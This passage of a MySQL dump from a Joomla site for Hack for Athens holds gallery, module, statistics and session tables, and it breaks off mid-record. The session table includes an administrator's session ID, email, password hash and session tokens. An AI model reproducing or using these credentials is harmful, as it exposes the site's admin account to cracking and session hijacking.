INSERT INTO `hfa_rokcommon_configs` VALUES (13,'roksprocket','container','/components/com_roksprocket/container.xml',10),(14,'roksprocket','library','/components/com_roksprocket/lib',10),(15,'rokgallery','container','/components/com_rokgallery/container.xml',10),(16,'rokgallery','library','/components/com_rokgallery/lib',10);
/*!40000 ALTER TABLE `hfa_rokcommon_configs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_file_loves`
--

DROP TABLE IF EXISTS `hfa_rokgallery_file_loves`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_file_loves` (
  `file_id` int(10) unsigned NOT NULL DEFAULT '0',
  `kount` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`file_id`),
  UNIQUE KEY `file_id` (`file_id`),
  CONSTRAINT `hfa_file_loves_file_id_files_id` FOREIGN KEY (`file_id`) REFERENCES `hfa_rokgallery_files` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_file_loves`
--

LOCK TABLES `hfa_rokgallery_file_loves` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_file_loves` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_file_loves` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_file_tags`
--

DROP TABLE IF EXISTS `hfa_rokgallery_file_tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_file_tags` (
  `file_id` int(10) unsigned NOT NULL DEFAULT '0',
  `tag` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`file_id`,`tag`),
  KEY `hfa_rokgallery_file_tags_file_id_idx` (`file_id`),
  CONSTRAINT `hfa_file_tags_file_id_files_id` FOREIGN KEY (`file_id`) REFERENCES `hfa_rokgallery_files` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_file_tags`
--

LOCK TABLES `hfa_rokgallery_file_tags` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_file_tags` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_file_tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_file_views`
--

DROP TABLE IF EXISTS `hfa_rokgallery_file_views`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_file_views` (
  `file_id` int(10) unsigned NOT NULL DEFAULT '0',
  `kount` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`file_id`),
  UNIQUE KEY `file_id` (`file_id`),
  CONSTRAINT `hfa_file_views_file_id__files_id` FOREIGN KEY (`file_id`) REFERENCES `hfa_rokgallery_files` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_file_views`
--

LOCK TABLES `hfa_rokgallery_file_views` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_file_views` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_file_views` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_files`
--

DROP TABLE IF EXISTS `hfa_rokgallery_files`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_files` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `filename` varchar(255) NOT NULL,
  `guid` char(36) NOT NULL,
  `md5` char(32) NOT NULL,
  `title` varchar(200) NOT NULL,
  `description` text,
  `license` varchar(255) DEFAULT NULL,
  `xsize` int(10) unsigned NOT NULL,
  `ysize` int(10) unsigned NOT NULL,
  `filesize` int(10) unsigned NOT NULL,
  `type` char(20) NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  `slug` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`),
  UNIQUE KEY `guid` (`guid`),
  UNIQUE KEY `hfa_files_sluggable_idx` (`slug`),
  KEY `hfa_rokgallery_files_published_idx` (`published`),
  KEY `hfa_rokgallery_files_md5_idx` (`md5`),
  KEY `hfa_rokgallery_files_guid_idx` (`guid`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_files`
--

LOCK TABLES `hfa_rokgallery_files` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_files` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_files` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_files_index`
--

DROP TABLE IF EXISTS `hfa_rokgallery_files_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_files_index` (
  `keyword` varchar(200) NOT NULL DEFAULT '',
  `field` varchar(50) NOT NULL DEFAULT '',
  `position` bigint(20) NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`keyword`,`field`,`position`,`id`),
  KEY `hfa_rokgallery_files_index_id_idx` (`id`),
  CONSTRAINT `hfa_rokgallery_files_index_id_idx` FOREIGN KEY (`id`) REFERENCES `hfa_rokgallery_files` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_files_index`
--

LOCK TABLES `hfa_rokgallery_files_index` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_files_index` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_files_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_filters`
--

DROP TABLE IF EXISTS `hfa_rokgallery_filters`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_filters` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `query` text NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`),
  KEY `rokgallery_profiles_name_idx` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_filters`
--

LOCK TABLES `hfa_rokgallery_filters` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_filters` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_filters` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_galleries`
--

DROP TABLE IF EXISTS `hfa_rokgallery_galleries`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_galleries` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `filetags` longtext,
  `width` int(10) unsigned NOT NULL DEFAULT '910',
  `height` int(10) unsigned NOT NULL DEFAULT '500',
  `keep_aspect` tinyint(1) DEFAULT '0',
  `force_image_size` tinyint(1) DEFAULT '0',
  `thumb_xsize` int(10) unsigned NOT NULL DEFAULT '190',
  `thumb_ysize` int(10) unsigned NOT NULL DEFAULT '150',
  `thumb_background` varchar(12) DEFAULT NULL,
  `thumb_keep_aspect` tinyint(1) DEFAULT '0',
  `auto_publish` tinyint(1) DEFAULT '0',
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`),
  KEY `hfa_rokgallery_galleries_auto_publish_idx` (`auto_publish`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_galleries`
--

LOCK TABLES `hfa_rokgallery_galleries` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_galleries` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_galleries` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_jobs`
--

DROP TABLE IF EXISTS `hfa_rokgallery_jobs`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_jobs` (
  `id` char(36) NOT NULL DEFAULT '',
  `type` varchar(255) NOT NULL,
  `properties` text,
  `state` varchar(255) NOT NULL,
  `status` text,
  `percent` bigint(20) unsigned DEFAULT NULL,
  `sm` text NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_jobs`
--

LOCK TABLES `hfa_rokgallery_jobs` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_jobs` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_jobs` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_profiles`
--

DROP TABLE IF EXISTS `hfa_rokgallery_profiles`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_profiles` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `profile` text NOT NULL,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`),
  KEY `hfa_rokgallery_profiles_name_idx` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_profiles`
--

LOCK TABLES `hfa_rokgallery_profiles` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_profiles` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_profiles` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_schema_version`
--

DROP TABLE IF EXISTS `hfa_rokgallery_schema_version`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_schema_version` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_schema_version`
--

LOCK TABLES `hfa_rokgallery_schema_version` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_schema_version` DISABLE KEYS */;
INSERT INTO `hfa_rokgallery_schema_version` VALUES (1);
/*!40000 ALTER TABLE `hfa_rokgallery_schema_version` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_slice_tags`
--

DROP TABLE IF EXISTS `hfa_rokgallery_slice_tags`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_slice_tags` (
  `slice_id` int(10) unsigned NOT NULL DEFAULT '0',
  `tag` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`slice_id`,`tag`),
  KEY `rokgallery_slice_tags_slice_id_idx` (`slice_id`),
  CONSTRAINT `hfa_slice_tags_slice_id_slices_id` FOREIGN KEY (`slice_id`) REFERENCES `hfa_rokgallery_slices` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_slice_tags`
--

LOCK TABLES `hfa_rokgallery_slice_tags` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_slice_tags` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_slice_tags` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_slices`
--

DROP TABLE IF EXISTS `hfa_rokgallery_slices`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_slices` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `file_id` int(10) unsigned NOT NULL,
  `gallery_id` int(10) unsigned DEFAULT NULL,
  `guid` char(36) NOT NULL,
  `title` varchar(200) DEFAULT NULL,
  `caption` text,
  `link` text,
  `filesize` int(10) unsigned NOT NULL,
  `xsize` int(10) unsigned NOT NULL,
  `ysize` int(10) unsigned NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `admin_thumb` tinyint(1) NOT NULL DEFAULT '0',
  `manipulations` longtext,
  `palette` text,
  `created_at` datetime NOT NULL,
  `updated_at` datetime NOT NULL,
  `slug` varchar(255) DEFAULT NULL,
  `thumb_xsize` int(10) unsigned NOT NULL,
  `thumb_ysize` int(10) unsigned NOT NULL,
  `thumb_keep_aspect` tinyint(1) NOT NULL DEFAULT '1',
  `thumb_background` varchar(12) DEFAULT NULL,
  `ordering` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `id` (`id`),
  UNIQUE KEY `guid` (`guid`),
  UNIQUE KEY `hfa_rokgallery_slices_sluggable_idx` (`slug`,`gallery_id`),
  KEY `rokgallery_slices_published_idx` (`published`),
  KEY `rokgallery_slices_guid_idx` (`guid`),
  KEY `file_id_idx` (`file_id`),
  KEY `gallery_id_idx` (`gallery_id`),
  CONSTRAINT `hfa_slices_file_id_files_id` FOREIGN KEY (`file_id`) REFERENCES `hfa_rokgallery_files` (`id`) ON DELETE CASCADE ON UPDATE CASCADE,
  CONSTRAINT `hfa_slices_gallery_id_galleries_id` FOREIGN KEY (`gallery_id`) REFERENCES `hfa_rokgallery_galleries` (`id`) ON DELETE SET NULL ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_slices`
--

LOCK TABLES `hfa_rokgallery_slices` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_slices` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_slices` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokgallery_slices_index`
--

DROP TABLE IF EXISTS `hfa_rokgallery_slices_index`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokgallery_slices_index` (
  `keyword` varchar(200) NOT NULL DEFAULT '',
  `field` varchar(50) NOT NULL DEFAULT '',
  `position` bigint(20) NOT NULL DEFAULT '0',
  `id` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`keyword`,`field`,`position`,`id`),
  KEY `rokgallery_slices_index_id_idx` (`id`),
  CONSTRAINT `hfa_rokgallery_slices_index_id_idx` FOREIGN KEY (`id`) REFERENCES `hfa_rokgallery_slices` (`id`) ON DELETE CASCADE ON UPDATE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokgallery_slices_index`
--

LOCK TABLES `hfa_rokgallery_slices_index` WRITE;
/*!40000 ALTER TABLE `hfa_rokgallery_slices_index` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokgallery_slices_index` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_roksprocket_items`
--

DROP TABLE IF EXISTS `hfa_roksprocket_items`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_roksprocket_items` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `module_id` varchar(45) NOT NULL,
  `provider` varchar(45) NOT NULL,
  `provider_id` varchar(45) NOT NULL,
  `order` int(10) unsigned NOT NULL,
  `params` text,
  PRIMARY KEY (`id`),
  KEY `idx_module` (`module_id`),
  KEY `idx_module_order` (`module_id`,`order`)
) ENGINE=InnoDB AUTO_INCREMENT=423 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_roksprocket_items`
--

LOCK TABLES `hfa_roksprocket_items` WRITE;
/*!40000 ALTER TABLE `hfa_roksprocket_items` DISABLE KEYS */;
INSERT INTO `hfa_roksprocket_items` VALUES (417,'231','joomla','44',0,'{\"tabs_item_title\":\"-default-\",\"tabs_item_icon\":\"-default-\",\"tabs_item_link\":\"-none-\",\"tabs_item_description\":\"-default-\",\"mosaic_item_title\":\"-default-\",\"lists_item_title\":\"-default-\",\"strips_item_title\":\"-default-\",\"mosaic_item_description\":\"-default-\",\"strips_item_image\":\"-default-\",\"mosaic_item_image\":\"-default-\",\"lists_item_image\":\"-default-\",\"lists_item_link\":\"-default-\",\"strips_item_link\":\"-default-\",\"mosaic_item_link\":\"-default-\",\"features_item_title\":\"-default-\",\"mosaic_item_tags\":null,\"lists_item_description\":\"-default-\",\"headlines_item_image\":\"-default-\",\"features_item_description\":\"-default-\",\"strips_item_description\":\"-default-\",\"headlines_item_link\":\"-default-\",\"features_item_image\":\"-default-\",\"features_item_link\":\"-default-\",\"headlines_item_description\":\"-default-\",\"features_item_icon\":\"-none-\"}'),(418,'231','joomla','40',1,'{\"tabs_item_title\":\"-default-\",\"tabs_item_icon\":\"-default-\",\"tabs_item_link\":\"-none-\",\"tabs_item_description\":\"-default-\",\"mosaic_item_title\":\"-default-\",\"lists_item_title\":\"-default-\",\"strips_item_title\":\"-default-\",\"mosaic_item_description\":\"-default-\",\"strips_item_image\":\"-default-\",\"mosaic_item_image\":\"-default-\",\"lists_item_image\":\"-default-\",\"lists_item_link\":\"-default-\",\"strips_item_link\":\"-default-\",\"mosaic_item_link\":\"-default-\",\"features_item_title\":\"-default-\",\"mosaic_item_tags\":null,\"lists_item_description\":\"-default-\",\"headlines_item_image\":\"-default-\",\"features_item_description\":\"-default-\",\"strips_item_description\":\"-default-\",\"headlines_item_link\":\"-default-\",\"features_item_image\":\"-default-\",\"features_item_link\":\"-default-\",\"headlines_item_description\":\"-default-\",\"features_item_icon\":\"-none-\"}'),(419,'231','joomla','41',2,'{\"tabs_item_title\":\"-default-\",\"tabs_item_icon\":\"-default-\",\"tabs_item_link\":\"-none-\",\"tabs_item_description\":\"-default-\",\"mosaic_item_title\":\"-default-\",\"lists_item_title\":\"-default-\",\"strips_item_title\":\"-default-\",\"mosaic_item_description\":\"-default-\",\"strips_item_image\":\"-default-\",\"mosaic_item_image\":\"-default-\",\"lists_item_image\":\"-default-\",\"lists_item_link\":\"-default-\",\"strips_item_link\":\"-default-\",\"mosaic_item_link\":\"-default-\",\"features_item_title\":\"-default-\",\"mosaic_item_tags\":null,\"lists_item_description\":\"-default-\",\"headlines_item_image\":\"-default-\",\"features_item_description\":\"-default-\",\"strips_item_description\":\"-default-\",\"headlines_item_link\":\"-default-\",\"features_item_image\":\"-default-\",\"features_item_link\":\"-default-\",\"headlines_item_description\":\"-default-\",\"features_item_icon\":\"-none-\"}'),(420,'231','joomla','47',3,'{\"tabs_item_title\":\"-default-\",\"tabs_item_icon\":\"-default-\",\"tabs_item_link\":\"-none-\",\"tabs_item_description\":\"-default-\",\"mosaic_item_title\":\"-default-\",\"lists_item_title\":\"-default-\",\"strips_item_title\":\"-default-\",\"mosaic_item_description\":\"-default-\",\"strips_item_image\":\"-default-\",\"mosaic_item_image\":\"-default-\",\"lists_item_image\":\"-default-\",\"lists_item_link\":\"-default-\",\"strips_item_link\":\"-default-\",\"mosaic_item_link\":\"-default-\",\"features_item_title\":\"-default-\",\"mosaic_item_tags\":null,\"lists_item_description\":\"-default-\",\"headlines_item_image\":\"-default-\",\"features_item_description\":\"-default-\",\"strips_item_description\":\"-default-\",\"headlines_item_link\":\"-default-\",\"features_item_image\":\"-default-\",\"features_item_link\":\"-default-\",\"headlines_item_description\":\"-default-\",\"features_item_icon\":\"-none-\"}'),(422,'166','joomla','38',0,'{\"features_item_title\":\"-none-\",\"features_item_description\":\"<div class=\\\"homepage-block\\\"><a href=\\\"\\/register\\\" class=\\\"readon\\\">Register Now<\\/a><h4 class=\\\"feature-promo2\\\"><span>National Day of Civic Hacking<\\/span>May 31st - June 1st, 2014<br\\/>330 Research Drive | Athens, GA<\\/h4><\\/div>\",\"features_item_image\":\"{\'type\':\'mediamanager\',\'path\':\'images\\/hackforathens-large-web.png\',\'preview\':\'\',\'link\':\'index.php?option=com_media&view=images&layout=default&tmpl=component&e_name=items_joomla_38__params_features_item_image&undefined\'}\",\"features_item_link\":\"-none-\",\"features_item_icon\":\"-none-\",\"lists_item_title\":\"-default-\",\"tabs_item_title\":\"-default-\",\"strips_item_title\":\"-default-\",\"mosaic_item_title\":\"-default-\",\"tabs_item_icon\":\"-default-\",\"mosaic_item_description\":\"-default-\",\"lists_item_image\":\"-default-\",\"mosaic_item_image\":\"-default-\",\"tabs_item_link\":\"-default-\",\"strips_item_image\":\"-default-\",\"mosaic_item_link\":\"-default-\",\"strips_item_link\":\"-default-\",\"tabs_item_description\":\"-default-\",\"lists_item_link\":\"-default-\",\"mosaic_item_tags\":null,\"lists_item_description\":\"-default-\",\"strips_item_description\":\"-default-\",\"headlines_item_image\":\"-default-\",\"headlines_item_link\":\"-default-\",\"headlines_item_description\":\"-default-\"}');
/*!40000 ALTER TABLE `hfa_roksprocket_items` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_rokuserstats`
--

DROP TABLE IF EXISTS `hfa_rokuserstats`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_rokuserstats` (
  `id` bigint(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) DEFAULT NULL,
  `ip` varchar(50) DEFAULT NULL,
  `session_id` varchar(50) DEFAULT NULL,
  `page` varchar(255) DEFAULT NULL,
  `referrer` varchar(255) DEFAULT NULL,
  `timestamp` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `ip` (`ip`),
  KEY `session_id` (`session_id`),
  KEY `timestamp` (`timestamp`)
) ENGINE=MyISAM AUTO_INCREMENT=4158 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_rokuserstats`
--

LOCK TABLES `hfa_rokuserstats` WRITE;
/*!40000 ALTER TABLE `hfa_rokuserstats` DISABLE KEYS */;
/*!40000 ALTER TABLE `hfa_rokuserstats` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_schemas`
--

DROP TABLE IF EXISTS `hfa_schemas`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_schemas` (
  `extension_id` int(11) NOT NULL,
  `version_id` varchar(20) NOT NULL,
  PRIMARY KEY (`extension_id`,`version_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_schemas`
--

LOCK TABLES `hfa_schemas` WRITE;
/*!40000 ALTER TABLE `hfa_schemas` DISABLE KEYS */;
INSERT INTO `hfa_schemas` VALUES (700,'3.2.3-2014-02-20'),(10229,'1.9.0');
/*!40000 ALTER TABLE `hfa_schemas` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `hfa_session`
--

DROP TABLE IF EXISTS `hfa_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `hfa_session` (
  `session_id` varchar(200) NOT NULL DEFAULT '',
  `client_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `guest` tinyint(4) unsigned DEFAULT '1',
  `time` varchar(14) DEFAULT '',
  `data` mediumtext,
  `userid` int(11) DEFAULT '0',
  `username` varchar(150) DEFAULT '',
  PRIMARY KEY (`session_id`),
  KEY `userid` (`userid`),
  KEY `time` (`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `hfa_session`
--

LOCK TABLES `hfa_session` WRITE;
/*!40000 ALTER TABLE `hfa_session` DISABLE KEYS */;
INSERT INTO `hfa_session` VALUES ('3lpf0m9goecdk60f9234r33sk1',1,0,'1398893310','__default|a:8:{s:15:\"session.counter\";i:42;s:19:\"session.timer.start\";i:1398893023;s:18:\"session.timer.last\";i:1398893310;s:17:\"session.timer.now\";i:1398893310;s:22:\"session.client.browser\";s:135:\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 Safari/537.36\";s:8:\"registry\";O:9:\"JRegistry\":1:{s:7:\"\\0\\0\\0data\";O:8:\"stdClass\":7:{s:11:\"application\";O:8:\"stdClass\":1:{s:4:\"lang\";s:5:\"en-GB\";}s:14:\"com_categories\";O:8:\"stdClass\":1:{s:10:\"categories\";O:8:\"stdClass\":1:{s:6:\"filter\";O:8:\"stdClass\":1:{s:9:\"extension\";s:11:\"com_content\";}}}s:14:\"com_b2jcontact\";O:8:\"stdClass\":1:{s:4:\"edit\";O:8:\"stdClass\":1:{s:7:\"contact\";O:8:\"stdClass\":2:{s:2:\"id\";a:0:{}s:4:\"data\";N;}}}s:11:\"com_contact\";O:8:\"stdClass\":1:{s:4:\"edit\";O:8:\"stdClass\":1:{s:7:\"contact\";O:8:\"stdClass\":2:{s:2:\"id\";a:0:{}s:4:\"data\";N;}}}s:10:\"pkg_kunena\";O:8:\"stdClass\":1:{s:11:\"updateCheck\";i:1398914892;}s:10:\"com_kunena\";O:8:\"stdClass\":1:{s:12:\"user254_read\";a:10:{i:2;s:1:\"2\";i:1;s:1:\"1\";i:6;s:1:\"6\";i:3;s:1:\"3\";i:7;s:1:\"7\";i:5;s:1:\"5\";i:8;s:1:\"8\";i:4;s:1:\"4\";i:9;s:1:\"9\";i:0;i:0;}}s:6:\"kunena\";O:8:\"stdClass\":1:{s:4:\"user\";O:8:\"stdClass\":1:{s:6:\"userid\";i:254;}}}}s:4:\"user\";O:5:\"JUser\":26:{s:9:\"\\0\\0\\0isRoot\";b:1;s:2:\"id\";s:3:\"254\";s:4:\"name\";s:13:\"Administrator\";s:8:\"username\";s:5:\"admin\";s:5:\"email\";s:25:\"support@hackforathens.org\";s:8:\"password\";s:34:\"$P$DnnTnqCJSN0MShRn9DW93GUPUjNxs1/\";s:14:\"password_clear\";s:0:\"\";s:5:\"block\";s:1:\"0\";s:9:\"sendEmail\";s:1:\"1\";s:12:\"registerDate\";s:19:\"2013-04-03 19:44:01\";s:13:\"lastvisitDate\";s:19:\"2014-04-30 21:23:42\";s:10:\"activation\";s:1:\"0\";s:6:\"params\";s:92:\"{\"editor\":\"\",\"timezone\":\"\",\"language\":\"\",\"admin_style\":\"\",\"admin_language\":\"\",\"helpsite\":\"\"}\";s:6:\"groups\";a:1:{i:8;s:1:\"8\";}s:5:\"guest\";i:0;s:13:\"lastResetTime\";s:19:\"0000-00-00 00:00:00\";s:10:\"resetCount\";s:1:\"0\";s:10:\"\\0\\0\\0_params\";O:9:\"JRegistry\":1:{s:7:\"\\0\\0\\0data\";O:8:\"stdClass\":6:{s:6:\"editor\";s:0:\"\";s:8:\"timezone\";s:0:\"\";s:8:\"language\";s:0:\"\";s:11:\"admin_style\";s:0:\"\";s:14:\"admin_language\";s:0:\"\";s:8:\"helpsite\";s:0:\"\";}}s:14:\"\\0\\0\\0_authGroups\";a:2:{i:0;i:1;i:1;i:8;}s:14:\"\\0\\0\\0_authLevels\";a:4:{i:0;i:1;i:1;i:1;i:2;i:2;i:3;i:3;}s:15:\"\\0\\0\\0_authActions\";N;s:12:\"\\0\\0\\0_errorMsg\";N;s:10:\"\\0\\0\\0_errors\";a:0:{}s:3:\"aid\";i:0;s:6:\"otpKey\";s:0:\"\";s:4:\"otep\";s:0:\"\";}s:13:\"session.token\";s:32:\"3196e3d3f3ed54ca68f9307f0799d54b\";}RESET_PHPBB_CACHE|i:1;__wf|a:1:{s:13:\"session.token\";s:32:\"168db305640b13816cce94cc5f8f6b53\";}',254,'admin'),('atuv32qgs67gifp8mpkbm94e44',0,1,'1398892925','__default|a:8:{s:15:\"session.counter\";i:1;s:19:\"session.timer.start\";i:1398892925;s:18:\"session.timer.last\";i:1398892925;s:17:\"session.timer.now\";i:1398892925;s:22:\"session.client.browser\";s:135:\"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/34.0.1847.116 Chrome/34.0.1847.116 